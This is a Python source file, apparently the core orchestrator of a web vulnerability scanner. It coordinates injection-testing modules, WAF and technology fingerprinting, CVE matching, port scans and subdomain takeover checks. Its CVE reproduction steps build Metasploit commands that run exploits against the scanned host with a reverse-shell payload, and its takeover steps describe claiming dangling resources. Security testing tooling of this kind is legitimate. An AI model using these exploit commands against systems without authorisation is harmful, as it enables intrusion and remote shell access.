"""Core scanner orchestration -- coordinates modules and manages the scan flow."""

import re
import socket
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional
from urllib.parse import urlparse
import logging

from .cve_db import extract_versions, match_cves
from .http_client import HTTPClient
from .modules.base import Finding
from .modules.cmdi import CommandInjectionScanner
from .modules.crlf import CRLFScanner
from .modules.headers import HeaderScanner
from .modules.bypass403 import Bypass403Scanner
from .modules.graphql import GraphQLScanner
from .modules.jwt_analyzer import JWTAnalyzer
from .modules.lfi import LFIScanner
from .modules.open_redirect import OpenRedirectScanner
from .modules.sqli import SQLiScanner
from .modules.ssti import SSTIScanner
from .modules.ssrf import SSRFScanner
from .modules.xss import XSSScanner
from .modules.xxe import XXEScanner
from .parser import (
    extract_forms,
    extract_params_from_url,
    get_base_url,
    parse_post_data,
)

_WAF_SIGNATURES = [
    (r"just a moment\.\.\.", "Cloudflare challenge"),
    (r"cloudflare", "Cloudflare"),
    (r"cf-ray", "Cloudflare"),
    (r"ddos-guard", "DDoS-Guard"),
    (r"access denied.*incapsula", "Imperva/Incapsula"),
    (r"request blocked.*mod_security", "ModSecurity"),
    (r"your ip has been blocked", "Generic WAF"),
    (r"blocked by the security rules", "Generic WAF"),
]

logger = logging.getLogger("vulnscanner")

_MODULE_MAP = {
    "sqli":      SQLiScanner,
    "xss":       XSSScanner,
    "lfi":       LFIScanner,
    "redirect":  OpenRedirectScanner,
    "cmdi":      CommandInjectionScanner,
    "crlf":      CRLFScanner,
    "ssti":      SSTIScanner,
    "headers":   HeaderScanner,
    "jwt":       JWTAnalyzer,
    "ssrf":      SSRFScanner,
    "xxe":       XXEScanner,
    "bypass403": Bypass403Scanner,
    "graphql":   GraphQLScanner,
}

# ANSI helpers for recon display
_CYAN = "\033[96m"
_DIM = "\033[2m"
_BOLD = "\033[1m"
_GREEN = "\033[92m"
_YELLOW = "\033[93m"
_RED = "\033[91m"
_RESET = "\033[0m"

# Default parallel module threads per parameter (overridden by --threads)
_DEFAULT_WORKERS = 4

# ---------------------------------------------------------------------------
# Technology fingerprints (header + body patterns)
# ---------------------------------------------------------------------------
_TECH_HEADER_SIGS = [
    ("X-Powered-By", r"PHP", "PHP"),
    ("X-Powered-By", r"ASP\.NET", "ASP.NET"),
    ("X-Powered-By", r"Express", "Express.js"),
    ("X-Powered-By", r"Servlet", "Java Servlet"),
    ("X-Generator", r"WordPress", "WordPress"),
    ("X-Generator", r"Drupal", "Drupal"),
    ("X-Drupal-Cache", r".", "Drupal"),
    ("Server", r"Apache", "Apache"),
    ("Server", r"nginx", "Nginx"),
    ("Server", r"Microsoft-IIS", "IIS"),
    ("Server", r"Werkzeug", "Flask/Werkzeug"),
    ("Server", r"gunicorn", "Gunicorn/Python"),
    ("Server", r"cloudflare", "Cloudflare"),
    ("Server", r"LiteSpeed", "LiteSpeed"),
    ("Set-Cookie", r"PHPSESSID", "PHP"),
    ("Set-Cookie", r"JSESSIONID", "Java"),
    ("Set-Cookie", r"ASP\.NET_SessionId", "ASP.NET"),
    ("Set-Cookie", r"csrftoken", "Django"),
    ("Set-Cookie", r"laravel_session", "Laravel"),
    ("Set-Cookie", r"rack\.session", "Ruby/Rack"),
    ("Set-Cookie", r"connect\.sid", "Node.js/Express"),
]

_TECH_BODY_SIGS = [
    (r"wp-content/", "WordPress"),
    (r"wp-includes/", "WordPress"),
    (r"/wp-json/", "WordPress"),
    (r"Joomla!", "Joomla"),
    (r"sites/default/files", "Drupal"),
    (r"content=\"WordPress", "WordPress"),
    (r"content=\"Joomla", "Joomla"),
    (r"content=\"Drupal", "Drupal"),
    (r"/__next/", "Next.js"),
    (r"/_nuxt/", "Nuxt.js"),
    (r"react\.production\.min\.js", "React"),
    (r"react-dom", "React"),
    (r"ng-version=", "Angular"),
    (r"vue\.(?:min\.)?js", "Vue.js"),
    (r"jquery[\.-]", "jQuery"),
    (r"bootstrap[\.-]", "Bootstrap"),
    (r"laravel", "Laravel"),
    (r"csrf-token", "Rails/Laravel"),
    (r"__vite", "Vite"),
    (r"/_astro/", "Astro"),
    (r"svelte", "Svelte"),
]


class Scanner:
    """Orchestrates vulnerability scanning across one or more modules.

    Usage::

        config = {"url": "http://target/page?id=1", "scan_type": "all", ...}
        findings = Scanner(config).run()
    """

    def __init__(self, config: Dict, app_logger=None) -> None:
        self.config = config
        self.findings: List[Finding] = []
        self._seen_keys: set = set()  # dedup: (vuln_type, url, param, payload)
        self._no_color = config.get("no_color", False)

        # Adaptive rate limiter (shared across all module threads)
        self._rate_limiter = None
        if config.get("rate_limit"):
            from .rate_limiter import AdaptiveRateLimiter
            min_d = float(config.get("rate_limit_delay", 0.0))
            self._rate_limiter = AdaptiveRateLimiter(min_delay=min_d)

        self.http = HTTPClient(
            headers=config.get("headers", {}),
            cookies=config.get("cookies", {}),
            proxy=config.get("proxy"),
            timeout=config.get("timeout", 10),
            follow_redirects=config.get("follow_redirects", True),
            rate_limiter=self._rate_limiter,
        )

        scan_type = config.get("scan_type", "all")
        if scan_type == "all":
            self.module_classes = list(_MODULE_MAP.values())
        elif scan_type in _MODULE_MAP:
            self.module_classes = [_MODULE_MAP[scan_type]]
        else:
            raise ValueError(f"Unknown scan type: {scan_type!r}")

    def run(self) -> List[Finding]:
        """Execute the scan and return all findings.

        On ``KeyboardInterrupt`` (Ctrl+C) the scan stops gracefully and
        returns every finding discovered so far so the reporter can still
        display partial results.
        """
        self._interrupted = False
        t0 = time.monotonic()
        url = self.config["url"]
        method = self.config.get("method", "GET").upper()
        data_string = self.config.get("data") or ""
        target_param = self.config.get("param")
        crawl = self.config.get("crawl", False)

        try:
            # -- Recon phase --
            if not self.config.get("quiet", False):
                self._print_recon(url)

            logger.info("Target  : %s [%s]", url, method)
            logger.info("Modules : %s", [cls.NAME for cls in self.module_classes])

            baseline_resp = self._preflight_check(url, method, data_string)

            # Notify user if static/CDN target detected (always visible, not just --verbose)
            if getattr(self, "_static_target", False) and not self.config.get("quiet", False):
                print(self._c(
                    "   [~] Static/CDN target detected — injection modules skipped. "
                    "Headers + GraphQL probes still active. Use --js-crawl for SPAs.",
                    _YELLOW,
                ))
                print()

            targets = self._build_targets(url, method, data_string, target_param)

            if (not targets or crawl) and baseline_resp is not None:
                form_targets = self._crawl_forms(url, baseline_resp, target_param)
                if form_targets:
                    existing_keys = {(t["url"], t["method"], t["param_name"]) for t in targets}
                    for ft in form_targets:
                        key = (ft["url"], ft["method"], ft["param_name"])
                        if key not in existing_keys:
                            targets.append(ft)
                            existing_keys.add(key)

            # JS-aware crawl (Playwright) — reveals SPA / modal forms
            if self.config.get("js_crawl"):
                js_targets = self._js_crawl(url, target_param, targets)
                targets.extend(js_targets)

            if not targets:
                logger.warning(
                    "No injectable parameters found. "
                    "Append query params to the URL (GET), supply --data (POST), "
                    "or use --crawl to auto-detect HTML forms."
                )
                return self.findings

            param_names = sorted({t["param_name"] for t in targets})
            logger.info("Parameters: %s", param_names)

            for target in targets:
                self._scan_target(target)

        except KeyboardInterrupt:
            self._interrupted = True
            print()  # newline after ^C
            logger.warning(
                "Scan interrupted by user (Ctrl+C). "
                "Delivering %d finding(s) collected so far.",
                len(self.findings),
            )

        elapsed = time.monotonic() - t0
        n = len(self.findings)
        if not self._interrupted:
            logger.info(
                "Scan complete -- %d finding%s in %.1fs.",
                n, "" if n == 1 else "s", elapsed,
            )
        return self.findings

    # ------------------------------------------------------------------
    # Recon display
    # ------------------------------------------------------------------

    def _c(self, text: str, code: str) -> str:
        return f"{code}{text}{_RESET}" if not self._no_color else text

    def _print_recon(self, url: str) -> None:
        """Resolve and display target information before scanning."""
        parsed = urlparse(url)
        hostname = parsed.hostname or ""

        # DNS resolution
        ip = "N/A"
        try:
            ip = socket.gethostbyname(hostname)
        except (socket.gaierror, OSError):
            pass

        # Quick GET request for server info + fingerprinting + latency
        server = ""
        status = ""
        latency_ms: Optional[float] = None
        techs: List[str] = []
        resp = None
        try:
            t0 = time.monotonic()
            resp = self.http.get(url)
            latency_ms = (time.monotonic() - t0) * 1000
            if resp is not None:
                status = str(resp.status_code)
                server = resp.headers.get("Server", "")
                techs = self._fingerprint(resp)
        except Exception:
            pass

        print(self._c("   +--- Target Recon ---", _DIM))
        print(self._c("   | Host     : ", _DIM) + self._c(hostname, _CYAN + _BOLD))
        print(self._c("   | IP       : ", _DIM) + self._c(ip, _CYAN))
        if status:
            sc = _GREEN if status.startswith("2") else (_YELLOW if status.startswith("3") else _RED)
            print(self._c("   | Status   : ", _DIM) + self._c(f"HTTP {status}", sc))
        if server:
            print(self._c("   | Server   : ", _DIM) + self._c(server, _YELLOW))
        # Remove techs already shown via Server header to avoid redundancy
        if server and techs:
            server_lower = server.lower().split("/")[0].strip()
            techs = [t for t in techs if t.lower() != server_lower]
        if techs:
            print(self._c("   | Tech     : ", _DIM) + self._c(", ".join(techs), _YELLOW))
        if latency_ms is not None:
            lat_color = _GREEN if latency_ms < 500 else (_YELLOW if latency_ms < 2000 else _RED)
            print(self._c("   | Latency  : ", _DIM) + self._c(f"{latency_ms:.0f}ms", lat_color))
        if resp is not None:
            size = len(resp.text)
            if size > 1024 * 1024:
                size_str = f"{size / (1024*1024):.1f} MB"
            elif size > 1024:
                size_str = f"{size / 1024:.1f} KB"
            else:
                size_str = f"{size} B"
            print(self._c("   | Size     : ", _DIM) + self._c(size_str, _CYAN))
        print(self._c("   | Scheme   : ", _DIM) + self._c(parsed.scheme.upper(), _CYAN))
        print(self._c("   +----------------------", _DIM))
        print()

        # -- CVE detection from service versions --
        if resp is not None:
            versions = extract_versions(resp)
            cve_matches = match_cves(versions)
            if cve_matches:
                self._print_cve_box(cve_matches)
                self._create_cve_findings(cve_matches, url, parsed)

        # -- Port scan (opt-in) --
        if self.config.get("port_scan") and ip != "N/A":
            self._run_port_scan(ip, hostname)

        # -- Path discovery (opt-in) --
        if self.config.get("discover_paths"):
            base = f"{parsed.scheme}://{parsed.netloc}"
            self._run_path_discovery(base)

        # -- Subdomain enumeration (opt-in) --
        if self.config.get("discover_subs") and hostname:
            parts = hostname.split(".")
            if len(parts) >= 2:
                domain = ".".join(parts[-2:])
                self._run_subdomain_enum(domain)

    def _print_cve_box(self, matches: List[dict]) -> None:
        """Display matched CVEs in a styled box below recon."""
        n = len(matches)
        print(self._c(
            f"   +--- Outdated Services ({n} CVE{'s' if n != 1 else ''}) ---",
            _RED + "\033[1m",
        ))

        for m in matches:
            sev = m["severity"]
            if sev == "CRITICAL":
                sev_c = _RED + "\033[1m"
            elif sev == "HIGH":
                sev_c = _RED
            elif sev == "MEDIUM":
                sev_c = _YELLOW
            else:
                sev_c = _CYAN

            # First sentence of impact for the summary line
            short = m["impact"].split(". ")[0]

            print(self._c("   |", _DIM))
            print(
                self._c("   | ", _DIM)
                + self._c(f"[{sev}] ", sev_c)
                + self._c(f"{m['cve']} ", "\033[1m")
                + self._c(f"(CVSS {m['cvss']})", _DIM)
            )
            print(
                self._c("   |   ", _DIM)
                + self._c(f"{m['service'].title()} {m['version']}", _YELLOW)
                + self._c(f" -- {short}", _DIM)
            )
            if m["msf"]:
                payload_hint = (
                    f"  [{m['msf_payload']}]" if m.get("msf_payload") else ""
                )
                print(
                    self._c("   |   MSF: ", _DIM)
                    + self._c(m["msf"], "\033[92m")
                    + self._c(payload_hint, _DIM)
                )

        print(self._c("   |", _DIM))
        print(self._c("   +----------------------------------", _DIM))
        print()

    def _create_cve_findings(
        self, matches: List[dict], url: str, parsed,
    ) -> None:
        """Generate Finding objects for each CVE match."""
        host = parsed.hostname or "target"
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        ssl_flag = "set SSL true; " if parsed.scheme == "https" else ""

        for m in matches:
            sev = m["severity"]
            if sev in ("CRITICAL", "HIGH"):
                conf = "high"
            elif sev == "MEDIUM":
                conf = "medium"
            else:
                conf = "low"

            # Build reproduction steps
            advisory = m.get("advisory", f"https://nvd.nist.gov/vuln/detail/{m['cve']}")
            repro_lines = [
                "# 1. Confirm the service version:",
                f'$ curl -s -k -I "{url}" | grep -iE "Server|X-Powered-By|X-Generator"',
                f"# Expected to contain: {m['service'].title()} {m['version']}",
                "",
                f"# 2. Vulnerability: {m['cve']}  CVSS {m['cvss']}  [{sev}]",
                f"# {m['impact'].split('. ')[0]}",
                f"# Advisory: {advisory}",
            ]
            if m["msf"]:
                payload = m.get("msf_payload") or "generic/shell_reverse_tcp"
                repro_lines += [
                    "",
                    "# 3. Verify exploitability with Metasploit:",
                    f'$ msfconsole -q -x "use {m["msf"]}; '
                    f'set RHOSTS {host}; set RPORT {port}; '
                    f'{ssl_flag}check"',
                    "",
                    "# 4. Exploit (replace <LHOST> with your listener IP):",
                    f'$ msfconsole -q -x "use {m["msf"]}; '
                    f'set RHOSTS {host}; set RPORT {port}; '
                    f'set LHOST <LHOST>; set PAYLOAD {payload}; '
                    f'{ssl_flag}run"',
                    "",
                    "# 5. Searchsploit for additional PoCs:",
                    f'$ searchsploit "{m["cve"]}"',
                ]
            else:
                repro_lines += [
                    "",
                    "# 3. Search for public exploits:",
                    f'$ searchsploit "{m["cve"]}"',
                    f'$ searchsploit "{m["service"]}" "{m["version"]}"',
                    "",
                    f"# 4. Advisory: {advisory}",
                ]

            finding = Finding(
                vuln_type=f"Known CVE: {m['cve']}",
                url=url,
                method="GET",
                parameter="(version disclosure)",
                payload="N/A",
                evidence=f"{m['service'].title()}/{m['version']}",
                confidence=conf,
                details=m["impact"],
                reproduction="\n".join(repro_lines),
            )
            key = (finding.vuln_type, finding.url, finding.parameter, finding.payload)
            if key not in self._seen_keys:
                self._seen_keys.add(key)
                self.findings.append(finding)

    # ------------------------------------------------------------------
    # Port scan display
    # ------------------------------------------------------------------

    def _run_port_scan(self, ip: str, hostname: str) -> None:
        from .port_scanner import scan_ports
        print(self._c("   +--- Port Scan ---", _DIM))
        print(self._c(f"   | Scanning {hostname} ({ip}) ...", _DIM))
        results = scan_ports(ip)
        if not results:
            print(self._c("   | No open ports found in common list.", _DIM))
        else:
            for r in results:
                banner = f"  [{r['banner'][:60]}]" if r["banner"] and r["banner"] != "open" else ""
                svc_c = _YELLOW if r["port"] not in (80, 443) else _GREEN
                print(
                    self._c("   | ", _DIM)
                    + self._c(f"{r['port']:5d}/tcp", svc_c)
                    + self._c(f"  {r['service']:<20}", _CYAN)
                    + self._c(banner, _DIM)
                )
        print(self._c("   +-------------------", _DIM))
        print()

    # ------------------------------------------------------------------
    # Path discovery display
    # ------------------------------------------------------------------

    def _run_path_discovery(self, base_url: str) -> None:
        from .discovery import discover_paths
        http = HTTPClient(
            headers=self.config.get("headers", {}),
            cookies=self.config.get("cookies", {}),
            proxy=self.config.get("proxy"),
            timeout=self.config.get("timeout", 6),
        )
        print(self._c("   +--- Path Discovery ---", _DIM))
        print(self._c(f"   | Probing {base_url} ...", _DIM))
        results = discover_paths(base_url, http)
        if not results:
            print(self._c("   | No interesting paths found.", _DIM))
        else:
            for r in results:
                code = r["status"]
                if code == 200:
                    cc = _GREEN
                elif code in (301, 302):
                    cc = _CYAN
                elif code == 401:
                    cc = _YELLOW
                elif code == 403:
                    cc = _RED
                else:
                    cc = _DIM
                size_kb = f"{r['size'] / 1024:.1f}KB"
                print(
                    self._c("   | ", _DIM)
                    + self._c(f"[{code}]", cc)
                    + self._c(f"  {r['path']:<45}", "\033[97m")
                    + self._c(f"  {size_kb}", _DIM)
                )
        print(self._c("   +----------------------", _DIM))
        print()

    # ------------------------------------------------------------------
    # Subdomain enumeration display
    # ------------------------------------------------------------------

    def _run_subdomain_enum(self, domain: str) -> None:
        from .discovery import enumerate_subdomains, check_subdomain_takeover
        print(self._c("   +--- Subdomain Enumeration ---", _DIM))
        print(self._c(f"   | Enumerating *.{domain} ...", _DIM))
        results = enumerate_subdomains(domain)
        if not results:
            print(self._c("   | No live subdomains found.", _DIM))
        else:
            for fqdn, ip in results:
                # Check for subdomain takeover opportunity
                takeover = check_subdomain_takeover(fqdn, http_client=self.http)
                if takeover:
                    tag = self._c(f"  [TAKEOVER? {takeover['service']}]", _RED + _BOLD)
                    self.findings.append(Finding(
                        vuln_type="Subdomain Takeover (Potential)",
                        url=f"http://{fqdn}",
                        method="GET",
                        parameter="(DNS / CNAME)",
                        payload="N/A",
                        evidence=takeover["evidence"],
                        confidence=takeover["confidence"],
                        details=(
                            f"Subdomain {fqdn!r} CNAME points to "
                            f"{takeover['cname']!r} ({takeover['service']}) "
                            f"but the service returns an unclaimed-site response. "
                            f"An attacker may be able to register the target resource "
                            f"and serve arbitrary content under {fqdn!r}. "
                            f"Remediation: remove the dangling CNAME record or "
                            f"reclaim the resource on {takeover['service']}."
                        ),
                        reproduction=(
                            f"# 1. Verify the dangling CNAME:\n"
                            f"$ dig CNAME {fqdn}\n"
                            f"# Expected: {fqdn} CNAME {takeover['cname']}\n"
                            f"# 2. Confirm the service is unclaimed:\n"
                            f"$ curl -sk 'http://{fqdn}' | head -20\n"
                            f"# 3. Register the resource on {takeover['service']} to claim it."
                        ),
                    ))
                else:
                    tag = ""
                print(
                    self._c("   | ", _DIM)
                    + self._c(f"{fqdn:<45}", _CYAN + _BOLD)
                    + self._c(f"  {ip}", _YELLOW)
                    + tag
                )
        print(self._c("   +-----------------------------", _DIM))
        print()

    # ------------------------------------------------------------------
    # Technology fingerprinting
    # ------------------------------------------------------------------

    @staticmethod
    def _fingerprint(resp) -> List[str]:
        """Detect technologies from response headers and body patterns."""
        detected = set()

        # Header-based detection
        for header_name, pattern, tech_name in _TECH_HEADER_SIGS:
            value = resp.headers.get(header_name, "")
            if value and re.search(pattern, value, re.IGNORECASE):
                detected.add(tech_name)

        # Body-based detection (only first 50KB to stay fast)
        body = resp.text[:51200].lower()
        for pattern, tech_name in _TECH_BODY_SIGS:
            if re.search(pattern, body, re.IGNORECASE):
                detected.add(tech_name)

        return sorted(detected)

    # ------------------------------------------------------------------
    # Private helpers
    # ------------------------------------------------------------------

    def _preflight_check(self, url: str, method: str, data_string: str):
        """Send one baseline request; warn on WAF/error; return the response."""
        if method == "GET":
            resp = self.http.get(url)
        else:
            resp = self.http.post(url, data=parse_post_data(data_string))

        if resp is None:
            logger.warning(
                "Baseline request failed (timeout or connection refused). "
                "Check the URL and your network connectivity."
            )
            return None

        logger.debug("Baseline: HTTP %d, %d bytes", resp.status_code, len(resp.text))

        if resp.status_code in (403, 429, 503):
            body_lower = resp.text.lower()
            for pattern, waf_name in _WAF_SIGNATURES:
                if re.search(pattern, body_lower, re.IGNORECASE):
                    logger.warning(
                        "WAF/bot-protection detected (%s) -- HTTP %d. "
                        "Requests are blocked before reaching the application; "
                        "results will be unreliable. "
                        "Try --cookies with a valid session, or --proxy via Burp.",
                        waf_name, resp.status_code,
                    )
                    return resp
            logger.warning(
                "HTTP %d on baseline -- target may require auth (try --cookies).",
                resp.status_code,
            )

        # Static / CDN detection — must run AFTER the first response is received
        self._static_target = self._detect_static_target(url, resp)

        return resp

    def _detect_static_target(self, url: str, baseline_resp) -> bool:
        """Return True if the server serves identical content for any input.

        CDN-hosted SPAs (Firebase Hosting, Netlify, GitHub Pages) return the
        same pre-compiled index.html for every request regardless of method,
        params, or body.  On such targets every injection finding is a false
        positive — the server never reads the payload.

        Detection heuristic (two layers):
          1. Cache header: x-cache=HIT or cf-cache-status=HIT → likely static.
          2. Response-content stability: send a POST with random garbage and
             compare body length+hash with the baseline GET.
        """
        import random
        import string
        import hashlib

        baseline_len = len(baseline_resp.text)
        baseline_hash = hashlib.md5(baseline_resp.text[:8192].encode("utf-8", "replace")).hexdigest()

        # Layer 1: cache hit headers → almost certainly serving cached static
        headers_lower = {k.lower(): v for k, v in baseline_resp.headers.items()}
        x_cache = headers_lower.get("x-cache", "").upper()
        cf_cache = headers_lower.get("cf-cache-status", "").upper()
        served_by = headers_lower.get("x-served-by", "")
        cache_hit = "HIT" in x_cache or "HIT" in cf_cache

        # Layer 2: POST with garbage → if response is identical → static
        token = "".join(random.choices(string.ascii_lowercase, k=10))
        try:
            r_post = self.http.post(url, data={f"okrscann_{token}": token})
        except Exception:
            r_post = None

        responses_identical = (
            r_post is not None
            and len(r_post.text) == baseline_len
            and hashlib.md5(r_post.text[:8192].encode("utf-8", "replace")).hexdigest() == baseline_hash
        )

        if cache_hit and responses_identical:
            logger.warning(
                "STATIC/CDN target detected (x-cache=HIT, POST==GET response). "
                "Injection modules will be skipped — server ignores request body. "
                "Only headers and recon checks will run. "
                "To scan dynamic endpoints on this domain use --data or --js-crawl.",
            )
            return True

        if responses_identical and r_post is not None:
            # No cache header but content is identical — double-check with a GET variant
            try:
                r_get2 = self.http.get(url + f"?okrscann_{token}={token}")
            except Exception:
                r_get2 = None
            if (
                r_get2 is not None
                and len(r_get2.text) == baseline_len
                and hashlib.md5(r_get2.text[:8192].encode("utf-8", "replace")).hexdigest() == baseline_hash
            ):
                logger.warning(
                    "STATIC target detected (GET/POST/GET+param all return identical content). "
                    "Injection modules skipped. Only headers/recon checks will run."
                )
                return True

        if cache_hit and not responses_identical:
            logger.info(
                "CDN cache HIT detected (%s%s) but responses differ — "
                "target may be partially dynamic.  Scanning continues normally.",
                x_cache or cf_cache,
                f" via {served_by[:40]}" if served_by else "",
            )

        return False

    def _build_targets(
        self, url, method, data_string, target_param,
    ) -> List[Dict]:
        targets: List[Dict] = []

        if method == "GET":
            params = extract_params_from_url(url)
            base = get_base_url(url)
            for name in params:
                if target_param and name != target_param:
                    continue
                targets.append(
                    {"url": base, "method": "GET", "params": params, "param_name": name}
                )

        elif method == "POST":
            params = parse_post_data(data_string)
            if not params:
                logger.debug("POST selected but --data is empty -- will try form crawl.")
            for name in params:
                if target_param and name != target_param:
                    continue
                targets.append(
                    {"url": url, "method": "POST", "params": params, "param_name": name}
                )

        return targets

    def _js_crawl(self, url: str, target_param, existing_targets: List[Dict]) -> List[Dict]:
        """Run the Playwright JS crawler and return new injectable targets."""
        from .js_crawler import js_crawl
        existing_keys = {(t["url"], t["method"], t["param_name"]) for t in existing_targets}

        # Pass cookies as raw string for Playwright context
        cookies_dict = self.config.get("cookies", {})
        cookies_raw = "; ".join(f"{k}={v}" for k, v in cookies_dict.items())

        js_cfg = {
            "headers": self.config.get("headers", {}),
            "cookies_raw": cookies_raw,
            "proxy": self.config.get("proxy"),
        }

        all_js = js_crawl(url, js_cfg, timeout=self.config.get("timeout", 20))

        new_targets = []
        for t in all_js:
            if target_param and t["param_name"] != target_param:
                continue
            key = (t["url"], t["method"], t["param_name"])
            if key not in existing_keys:
                existing_keys.add(key)
                new_targets.append(t)

        if new_targets:
            param_names = sorted({t["param_name"] for t in new_targets})
            logger.info(
                "JS-crawl: found %d new injectable field(s): %s",
                len(new_targets), param_names,
            )
        return new_targets

    def _crawl_forms(self, url, baseline_resp, target_param) -> List[Dict]:
        """Parse HTML forms from *baseline_resp* and return injectable targets."""
        try:
            forms = extract_forms(baseline_resp.text, url)
        except Exception as exc:
            logger.debug("Form extraction error: %s", exc)
            return []

        if not forms:
            return []

        logger.info(
            "Auto-crawl: found %d form(s) -- testing their fields automatically.",
            len(forms),
        )

        targets = []
        for form in forms:
            action = form["action"]
            method = form["method"]
            params = {
                inp["name"]: inp["value"]
                for inp in form["inputs"]
                if inp["name"]
            }
            if not params:
                continue

            logger.info(
                "  Form: [%s] %s  fields=%s",
                method, action, list(params.keys()),
            )

            for name in params:
                if target_param and name != target_param:
                    continue
                targets.append(
                    {
                        "url": action,
                        "method": method,
                        "params": params,
                        "param_name": name,
                    }
                )

        return targets

    def _scan_target(self, target: Dict) -> None:
        url = target["url"]
        method = target["method"]
        params = target["params"]
        param_name = target["param_name"]

        logger.info("  Testing param=%r [%s]", param_name, method)

        # Injection-only modules — skipped entirely on static/CDN targets
        _INJECTION_MODULES = {
            "sqli", "xss", "lfi", "cmdi", "ssti", "crlf",
            "redirect", "jwt", "ssrf", "xxe", "bypass403",
        }
        static = getattr(self, "_static_target", False)

        # Each module gets its own HTTPClient so they can scan in parallel
        # without sharing state (e.g. redirect following toggle).
        # The rate limiter IS shared -- it's the single global throttle.
        def _run_module(module_cls):
            http_copy = HTTPClient(
                headers=self.config.get("headers", {}),
                cookies=self.config.get("cookies", {}),
                proxy=self.config.get("proxy"),
                timeout=self.config.get("timeout", 10),
                follow_redirects=self.config.get("follow_redirects", True),
                rate_limiter=self._rate_limiter,
            )
            module = module_cls(http_copy, self.config)
            return module.scan_parameter(url, method, params, param_name)

        # Run modules concurrently for speed
        # On static/CDN targets, skip injection modules to avoid false positives
        active_classes = [
            cls for cls in self.module_classes
            if not (static and cls.NAME in _INJECTION_MODULES)
        ]
        if static and len(active_classes) < len(self.module_classes):
            skipped = [cls.NAME for cls in self.module_classes if cls not in active_classes]
            logger.debug("Static target: skipping injection modules %s", skipped)

        max_workers = self.config.get("threads", _DEFAULT_WORKERS)
        with ThreadPoolExecutor(max_workers=max_workers) as pool:
            futures = {
                pool.submit(_run_module, cls): cls.NAME
                for cls in active_classes
            }
            try:
                total_mods = len(futures)
                done_count = 0
                for future in as_completed(futures):
                    mod_name = futures[future]
                    done_count += 1
                    try:
                        new_findings = future.result()
                    except Exception as exc:
                        logger.debug("Module %s error: %s", mod_name, exc)
                        continue
                    for f in new_findings:
                        key = (f.vuln_type, f.url, f.parameter, f.payload)
                        if key in self._seen_keys:
                            continue
                        self._seen_keys.add(key)
                        logger.info(
                            "    [VULN] %s  param=%r  confidence=%s",
                            f.vuln_type, f.parameter, f.confidence,
                        )
                        self.findings.append(f)
                    # Inline progress (overwrite same line)
                    if not self.config.get("quiet", False) and sys.stdout.isatty():
                        bar = "#" * done_count + "-" * (total_mods - done_count)
                        sys.stdout.write(
                            f"\r    [{bar}] {done_count}/{total_mods} {mod_name} done  "
                        )
                        sys.stdout.flush()
                # Clear the progress line
                if not self.config.get("quiet", False) and sys.stdout.isatty():
                    sys.stdout.write("\r" + " " * 60 + "\r")
                    sys.stdout.flush()
            except KeyboardInterrupt:
                # Cancel futures that haven't started yet
                for fut in futures:
                    fut.cancel()
                # Collect results from futures that already finished
                for fut, mod_name in futures.items():
                    if fut.done() and not fut.cancelled():
                        try:
                            for f in fut.result():
                                key = (f.vuln_type, f.url, f.parameter, f.payload)
                                if key not in self._seen_keys:
                                    self._seen_keys.add(key)
                                    self.findings.append(f)
                        except Exception:
                            pass
                raise  # re-raise so the outer handler in run() catches it
